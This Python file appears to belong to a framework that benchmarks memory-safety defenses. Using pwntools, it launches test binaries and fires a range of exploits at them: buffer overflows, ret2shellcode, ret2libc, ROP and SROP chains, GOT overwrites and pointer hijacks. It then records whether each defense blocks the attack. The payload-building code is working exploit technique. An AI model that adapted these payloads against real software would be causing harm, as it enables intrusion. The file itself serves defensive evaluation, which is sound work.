import os
import time
import json
from pwn import *
import configparser

# enable pwntools debug mode
# context.log_level="debug"
context.log_level = 'error'

conf = configparser.ConfigParser()
conf.read('DefEval.cfg', encoding='utf-8')

def error(s):
	CRED = '\033[91m'
	CEND = '\033[0m'
	input(CRED + "Error: {}!".format(s) + CEND)

RECIPE_ARCH = conf.get('CONFIG', 'arch')
if RECIPE_ARCH=="64":
	context.arch="amd64"
	addr_size = 8
elif RECIPE_ARCH=="32":
	context.arch="i386"
	addr_size = 4
else:
	error("wrong ARCH:{}".format(RECIPE_ARCH))

# runtime defense
check_file = conf.get('CONFIG', 'check_file')
log_file = conf.get('CONFIG', 'log_file')

max_waiting_time = int(conf.get('CONFIG', 'max_waiting_time'))

def addr2byte(addr):
	if RECIPE_ARCH=="64":
		return p64(addr)
	elif RECIPE_ARCH=="32":
		return p32(addr)
	else:
		error("arch not supported")

def parse_dimensions(dir_name):
	name_list = dir_name.split("/")[-1].split("_")
	retVal = [None, None, None, None]
	for i in range(len(name_list)):
		retVal[i] = name_list[i]
	return retVal

def get_gadget_dict(filepath):
	### the input file should be the result from ROPgadget ###
	### format: {disass_code:addr} ###
	gadget_dict = {}
	f = open(filepath, 'r')
	lines = f.readlines()
	for each_line in lines:
		if each_line[0]=='0':
			addr_code = each_line.split(':')
			new_gadget =  { addr_code[1].strip(' ').strip('\n') : addr_code[0] }
			gadget_dict.update(new_gadget)
	return gadget_dict

### sometimes we cannot find gadget ###
def robust_get_gadget(gadget, name):
	try:
		return int(gadget[name.strip(' ')], 16)
	except:
		error("cannot find gadget: {}".format(name))
		return 0xdeadbeef

class recipe_attack:
	valgrind = 0
	### add env variable liks LD_PRELOAD ###
	# env = {"LD_PRELOAD":"/path/to/lib"}
	env = None
	result_file = conf.get('CONFIG', 'output_file')
	def __init__(self, target, path, result_fp, exploit, runtime_defense):
		self.target = target
		self.exploit = exploit
		self.record_file = "{}/record".format(path)
		self.elf = "{}/main".format(path)
		### please follow valgrind example to add runtime defense ###
		if runtime_defense=="valgrind":
			self.valgrind=1  ### valgrind has special output, which needs special handler below
			self.elf = ["valgrind", "--exit-on-first-error=yes", "--undef-value-errors=no", "--error-exitcode=2","{}/main".format(path)]
		### check https://docs.pwntools.com/en/stable/shellcraft.html for various shellcode ###
		self.shellcode = asm(shellcraft.creat(check_file))
		self.target_addr = 0xdeadbeef
		self.input_addr = 0xdeadbeef
		self.system_addr = 0xdeadbeef
		self.bad_addr = 0xdeadbeef
		self.cmd_addr = 0xdeadbeef
		self.pointer_addr = 0xdeadbeef
		self.exit_addr = 0xdeadbeef
		self.gadget = get_gadget_dict("{}/gadget".format(path))
		self.result_fp = result_fp

	def record(self, msg):
		f = open(self.record_file, "a")
		f.write(time.asctime()+": "+msg+"\n")
		f.close()

	def store_result(self, msg):
		self.result_fp.write(msg)

	def robust_recvuntil(self, p, stop):
		try:
			return p.recvuntil(stop)
		except:
			error("recv error")
			result = log_analysis()
			self.store_result("{},".format(result))
			self.record("{},".format(result))
			return False

	def robust_sendline(self, p, msg):
		try:
			p.sendline(msg)
			return True
		except:
			error("send error!")
			return False
	
	def robust_send(self, p, msg):
		try:
			p.send(msg)
			return True
		except:
			error("send error!")
			return False
	
	def trykill(self, p):
		try:
			p.kill()
		except:
			print("warning: cannot kill process.")
			pass
	
	### RecIPE uses stdout to leak info, which can be improved by an automated tool ###
	def info_leak(self, p):
		info = {}
		try:
			info_str = self.robust_recvuntil(p, b"\n")
			info_list = info_str.strip(b"\n").split(b" ")
			for each_info in info_list:
				info_name = each_info.split(b":")[0]
				info_value = int(each_info.split(b":")[1], 16)
				new_info = {info_name: info_value}
				info.update(new_info)
		except:
			error("info leak error!")
		return info

	def log_analysis(self):
		try:
			# sometimes non utf-8 chars will be in logfile?
			logfile = open(log_file, "r", encoding = "ISO-8859-1")
		except:
			return "failed_without_logfile"
		log = logfile.read()
		logfile.close()
		if ("Attacked" or "attacked") in log:
			result = "attacked"
		else:
			result = "failed"
		return result

	def exploit_check(self, p):
		start = time.time()
		while True:
			if p.poll() != None:
				break
			if time.time()-start > max_waiting_time:
				break
		if os.path.exists(check_file):
			os.remove(check_file)
			return True
		else:
			return False

	def check_result(self, p):
		### first check if exploit works ### 
		if self.exploit_check(p):
			self.store_result("exploited")
			self.record("exploited")
			self.trykill(p)
			return 1
		### if exploit fails, check if attack works ###
		else:
			result = self.log_analysis()
			self.store_result("{},".format(result))
			self.record("{},".format(result))
			self.trykill(p)
			return 0

### boundary overflow ###

class recipe_stack_BoundOFlow(recipe_attack):
	def start(self):
		p = process(self.elf, env=self.env)
		if self.valgrind==1:
			self.robust_recvuntil(p, b"== \n")
			elf = ELF(self.elf[-1])
		else:
			elf = ELF(self.elf)
		info_list = self.info_leak(p)
		self.input_addr = info_list[b"input_addr"]
		self.target_addr = info_list[b"target_addr"]
		self.bad_addr = info_list[b"bad_addr"]
		self.system_addr = info_list[b"system_addr"]
		self.cmd_addr = info_list[b"cmd_addr"]
		self.exit_addr = info_list[b"exit_addr"]
		return self.recipe_stack_BoundOFlow_exp(p)

	def recipe_stack_BoundOFlow_exp(self, p):
		offset = self.target_addr - self.input_addr
		if offset>0x10000:
			result = log_analysis()
			self.store_result("{},".format(result))
			self.record("{},".format(result))
			self.trykill(p)
			return 0
		if self.target=="retaddr":
			if self.exploit=="ret2shellcode":
				payload = self.shellcode
				payload += b'a'*(offset-len(payload))
				payload += addr2byte(self.input_addr)
			elif self.exploit=="ret2libc":
				payload = b'a'*offset
				if RECIPE_ARCH=="64":
					payload += addr2byte(robust_get_gadget(self.gadget, "pop rdi ; ret"))
					payload += addr2byte(self.cmd_addr)
					padding = int(len(payload)%16/8)
					for i in range(padding):
						payload += addr2byte(robust_get_gadget(self.gadget, "ret"))
					payload += addr2byte(self.system_addr)
				elif RECIPE_ARCH=="32":
					payload += addr2byte(self.system_addr)
					payload += addr2byte(0xdeadbeef)
					payload += addr2byte(self.cmd_addr)
			elif self.exploit=="ret2text":
				payload = b'a'*offset
				payload += addr2byte(self.bad_addr)
			elif self.exploit=="ROP":
				try:
					payload = b'a'*offset
					if RECIPE_ARCH=="64":
						payload += addr2byte(robust_get_gadget(self.gadget, "pop rdi ; ret"))
						payload += addr2byte(self.cmd_addr)
						payload += addr2byte(robust_get_gadget(self.gadget, "pop rdx ; ret"))
						padding = int(len(payload)%16/8)
						for i in range(padding):
							payload += addr2byte(robust_get_gadget(self.gadget, "ret"))
						payload += addr2byte(self.system_addr)
						payload += addr2byte(robust_get_gadget(self.gadget, "call rdx"))
						payload += addr2byte(self.exit_addr)
					elif RECIPE_ARCH=="32":
						payload += addr2byte(robust_get_gadget(self.gadget, "pop edx ; ret"))
						payload += addr2byte(self.system_addr)
						payload += addr2byte(robust_get_gadget(self.gadget, "call edx"))
						payload += addr2byte(self.cmd_addr)
				except:
					result = log_analysis()
					self.store_result("{},".format(result))
					self.record("{},".format(result))
			### SROP. Please refer to https://docs.pwntools.com/en/stable/rop/srop.html ###
			elif self.exploit=="SROP":
				payload = asm(shellcraft.creat(check_file))
				payload = payload.ljust(offset, b'A')
				if RECIPE_ARCH=="64":
					payload += addr2byte(robust_get_gadget(self.gadget, "pop rax ; ret"))
					payload += addr2byte(15)
					payload += addr2byte(robust_get_gadget(self.gadget, "syscall"))
				elif RECIPE_ARCH=="32":
					payload += addr2byte(robust_get_gadget(self.gadget, "pop eax ; ret"))
					payload += addr2byte(173)
					payload += addr2byte(robust_get_gadget(self.gadget, "syscall"))
				if RECIPE_ARCH=="64":
					frame = SigreturnFrame(kernel='amd64')
					frame.rax = 10
					frame.rdi = self.input_addr
					frame.rsi = 2000
					frame.rdx = 7
					frame.rsp = self.input_addr + len(payload) + len(bytes(frame))
					frame.rip = robust_get_gadget(self.gadget, "syscall")
				elif RECIPE_ARCH=="32":
					frame = SigreturnFrame(kernel='i386')
					frame.eax = 125
					frame.ebx = self.input_addr
					frame.ecx = 2000
					frame.edx = 7
					frame.esp = self.input_addr + len(payload) + len(bytes(frame))
					frame.eip = robust_get_gadget(self.gadget, "syscall")
				payload += bytes(frame)
				payload += addr2byte(self.input_addr)
		elif self.target=="oldebp":
			if self.exploit=="ret2shellcode":
				payload = addr2byte(self.input_addr+addr_size)
				payload += addr2byte(self.input_addr+addr_size*2)
				payload += self.shellcode
				payload += b'a'*(offset-len(payload))
				payload += addr2byte(self.input_addr)
			elif self.exploit=="ret2libc":
				payload = addr2byte(self.input_addr+addr_size)
				if RECIPE_ARCH=="64":
					payload += addr2byte(robust_get_gadget(self.gadget, "pop rdi ; ret"))
					payload += addr2byte(self.cmd_addr)
					### If you're using Ubuntu 18.04 and segfaulting on a movaps instruction in buffered_vfprintf() or do_system() in the 64 bit challenges then ensure the stack is 16 byte aligned before returning to GLIBC functions such as printf() and system(). The version of GLIBC packaged with Ubuntu 18.04 uses movaps instructions to move data onto the stack in some functions. The 64 bit calling convention requires the stack to be 16 byte aligned before a call instruction but this is easily violated during ROP chain execution, causing all further calls from that function to be made with a misaligned stack. movaps triggers a general protection fault when operating on unaligned data, so try padding your ROP chain with an extra ret before returning into a function or return further into a function to skip a push instruction.
					payload += addr2byte(robust_get_gadget(self.gadget, "ret"))
					payload += addr2byte(self.system_addr)
				else:
					payload += addr2byte(self.system_addr)
					payload += addr2byte(0xdeadbeef)
					payload += addr2byte(self.cmd_addr)
				payload += b'a'*(offset - len(payload))
				payload += addr2byte(self.input_addr)
			elif self.exploit=="ret2text":
				payload = addr2byte(self.input_addr+addr_size)
				### If you're using Ubuntu 18.04 and segfaulting on a movaps instruction in buffered_vfprintf() or do_system() in the 64 bit challenges then ensure the stack is 16 byte aligned before returning to GLIBC functions such as printf() and system(). The version of GLIBC packaged with Ubuntu 18.04 uses movaps instructions to move data onto the stack in some functions. The 64 bit calling convention requires the stack to be 16 byte aligned before a call instruction but this is easily violated during ROP chain execution, causing all further calls from that function to be made with a misaligned stack. movaps triggers a general protection fault when operating on unaligned data, so try padding your ROP chain with an extra ret before returning into a function or return further into a function to skip a push instruction.		
				payload += addr2byte(robust_get_gadget(self.gadget, "ret"))
				payload += addr2byte(self.bad_addr)
				payload += b'a'*(offset - len(payload))
				payload += addr2byte(self.input_addr)
			elif self.exploit=="ROP":
				payload = addr2byte(self.input_addr+addr_size)
				if RECIPE_ARCH=="64":
					payload += addr2byte(robust_get_gadget(self.gadget, "pop rdi ; ret"))
					payload += addr2byte(self.cmd_addr)
					payload += addr2byte(robust_get_gadget(self.gadget, "pop rdx ; ret"))
					padding = int(len(payload)%16/8)
					for i in range(padding):
						payload += addr2byte(robust_get_gadget(self.gadget, "ret"))
					payload += addr2byte(self.system_addr)
					payload += addr2byte(robust_get_gadget(self.gadget, "call rdx"))
					payload += addr2byte(self.exit_addr)
					payload += b'a'*(offset - len(payload))
					payload += addr2byte(self.input_addr)
				else:
					payload += addr2byte(robust_get_gadget(self.gadget, "pop edx ; ret"))
					payload += addr2byte(self.system_addr)
					payload += addr2byte(robust_get_gadget(self.gadget, "call edx"))
					payload += addr2byte(self.cmd_addr)
					payload += b'a'*(offset - len(payload))
					payload += addr2byte(self.input_addr)
			else:
				print("not supported")
		else:
			payload = b'a'*offset
			payload += addr2byte(self.bad_addr)
		self.robust_sendline(p, payload)
		return self.check_result(p)

### non-boundary overflow is sending bad address and simple, the overflow logic is in C code ###
class recipe_stack_NBoundOFlow(recipe_attack):
	def start(self):
		p = process(self.elf, env=self.env)
		if self.valgrind==1:
			self.robust_recvuntil(p, b"== \n")
		info = self.info_leak(p)
		self.bad_addr = info[b"bad_addr"]
		self.robust_sendline(p, addr2byte(self.bad_addr))
		return self.check_result(p)

recipe_heap_NBoundOFlow = recipe_stack_NBoundOFlow
recipe_data_NBoundOFlow = recipe_stack_NBoundOFlow
recipe_bss_NBoundOFlow = recipe_stack_NBoundOFlow

### stack non-boundary underflow trigger by int overflow ###
class recipe_stack_NBoundUFlow(recipe_attack):
	def start(self):
		p = process(self.elf, env=self.env)
		if self.valgrind==1:
			self.robust_recvuntil(p, b"== \n")
		info_list = self.info_leak(p)
		self.input_addr = info_list[b"input_addr"]
		self.target_addr = info_list[b"target_addr"]
		self.bad_addr = info_list[b"bad_addr"]
		offset = self.input_addr - self.target_addr
		assert(offset>0)
		num = 65536-offset
		self.robust_send(p, bytes(str(num), 'utf-8'))
		sleep(0.1)
		payload = addr2byte(self.bad_addr)
		self.robust_sendline(p, payload)
		return self.check_result(p)

recipe_heap_NBoundUFlow = recipe_stack_NBoundUFlow
recipe_data_NBoundUFlow = recipe_stack_NBoundUFlow
recipe_bss_NBoundUFlow = recipe_stack_NBoundUFlow

class recipe_stack_StructOFlow(recipe_attack):
	def start(self):
		p = process(self.elf, env=self.env)
		if self.valgrind==1:
			self.robust_recvuntil(p, b"== \n")
		info_list = self.info_leak(p)
		self.input_addr = info_list[b"input_addr"]
		self.target_addr = info_list[b"target_addr"]
		self.bad_addr = info_list[b"bad_addr"]
		return self.recipe_stack_StructOFlow_exp(p)
		
	def recipe_stack_StructOFlow_exp(self, p):
		offset = self.target_addr - self.input_addr
		payload = b'a'*offset
		payload += addr2byte(self.bad_addr)
		self.robust_sendline(p, payload)
		return self.check_result(p)

recipe_heap_StructOFlow = recipe_stack_StructOFlow
recipe_data_StructOFlow = recipe_stack_StructOFlow
recipe_bss_StructOFlow = recipe_stack_StructOFlow

class recipe_stack_OOBPtrHijack(recipe_attack):
	def start(self):
		p = process(self.elf, env=self.env)
		if self.valgrind==1:
			self.robust_recvuntil(p, b"== \n")
		info_list = self.info_leak(p)
		self.pointer_addr = info_list[b"pointer_addr"]
		self.input_addr = info_list[b"input_addr"]
		self.target_addr = info_list[b"target_addr"]
		self.bad_addr = info_list[b"bad_addr"]
		return self.recipe_stack_OOBPtrHijack_exp(p)
	
	def recipe_stack_OOBPtrHijack_exp(self, p):
		offset = self.pointer_addr - self.input_addr
		payload = ""
		if self.target=="GOT":
			if self.valgrind==1:
				elf = ELF(self.elf[-1])
			else:
				elf = ELF(self.elf)
			self.target_addr = elf.got["getuid"]
		if self.target!="oldebp":
			payload = b'a'*(offset)
			payload += addr2byte(self.target_addr)
		elif self.target=="oldebp":
			payload = b'a'*addr_size
			payload += addr2byte(self.input_addr)
			payload += b'a'*(offset-len(payload))
			payload += addr2byte(self.target_addr)
		self.robust_send(p, payload)
		time.sleep(0.1)
		self.robust_send(p, addr2byte(self.bad_addr))	
		return self.check_result(p)

recipe_heap_OOBPtrHijack = recipe_stack_OOBPtrHijack
recipe_data_OOBPtrHijack = recipe_stack_OOBPtrHijack
recipe_bss_OOBPtrHijack = recipe_stack_OOBPtrHijack

class recipe_stack_PtrHijack(recipe_attack):
	def start(self):
		p = process(self.elf, env=self.env)
		if self.valgrind==1:
			self.robust_recvuntil(p, b"== \n")
		info_list = self.info_leak(p)
		self.target_addr = info_list[b"target_addr"]
		self.bad_addr = info_list[b"bad_addr"]
		return self.recipe_stack_PtrHijack_exp(p)
	
	def recipe_stack_PtrHijack_exp(self, p):
		if self.target=="GOT":
			if self.valgrind==1:
				elf = ELF(self.elf[-1])
			else:
				elf = ELF(self.elf)
			self.target_addr = elf.got["getuid"]
		payload = addr2byte(self.target_addr)
		self.robust_send(p, payload)
		time.sleep(0.1)
		if self.target=="data":
			self.robust_sendline(p, addr2byte(0x1))
		else:
			self.robust_sendline(p, addr2byte(self.bad_addr))
		return self.check_result(p)

class recipe_heap_BoundOFlow(recipe_attack):
	def start(self):
		p = process(self.elf, env=self.env)
		if self.valgrind==1:
			self.robust_recvuntil(p, b"== \n")
		info_list = self.info_leak(p)
		self.target_addr = info_list[b"target_addr"]
		self.input_addr = info_list[b"input_addr"]
		self.bad_addr = info_list[b"bad_addr"]
		return self.recipe_heap_BoundOFlow_exp(p)

	def recipe_heap_BoundOFlow_exp(self, p):
		offset = self.target_addr - self.input_addr
		payload = b'a'*offset
		payload += addr2byte(self.bad_addr)
		self.robust_sendline(p, payload)
		return self.check_result(p)

recipe_data_BoundOFlow = recipe_heap_BoundOFlow
recipe_bss_BoundOFlow = recipe_heap_BoundOFlow
